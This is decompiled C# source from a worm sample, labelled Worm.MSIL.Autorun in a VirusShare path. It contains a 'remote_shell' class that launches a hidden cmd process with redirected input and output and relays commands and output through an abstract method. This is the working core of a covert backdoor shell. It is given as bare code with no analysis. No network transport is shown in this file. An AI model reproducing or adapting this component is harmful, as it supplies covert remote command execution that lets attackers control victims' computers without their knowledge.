// Decompiled with JetBrains decompiler
// Type: remote_shell.shell
// Assembly: explorer, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: 56E5CD67-A795-400A-AA93-F7890471D495
// Assembly location: C:\Users\Administrateur\Downloads\Virusshare-00008-msil\Worm.MSIL.Autorun.ig-2c86700b4d3a736629e63a7f91f6e488e611145530107c5a2b53ad8867079764.exe

using System.Diagnostics;
using System.IO;
using System.Threading;

namespace remote_shell
{
  internal abstract class shell
  {
    private StreamReader read;
    private StreamWriter write;
    private Process p;
    private Thread t;

    public void start()
    {
      this.p = new Process();
      this.p.StartInfo.FileName = "cmd";
      this.p.StartInfo.UseShellExecute = false;
      this.p.StartInfo.WindowStyle = ProcessWindowStyle.Hidden;
      this.p.StartInfo.CreateNoWindow = true;
      this.p.StartInfo.RedirectStandardInput = true;
      this.p.StartInfo.RedirectStandardOutput = true;
      this.p.Start();
      this.read = this.p.StandardOutput;
      this.write = this.p.StandardInput;
      this.t = new Thread(new ThreadStart(this.reading));
      this.t.Start();
    }

    private void reading()
    {
      while (!this.read.EndOfStream)
        this.newLine(this.read.ReadLine());
    }

    public void writeLine(string line) => this.write.WriteLine(line);

    public void writeData(string data) => this.write.Write(data);

    public abstract void newLine(string line);
  }
}
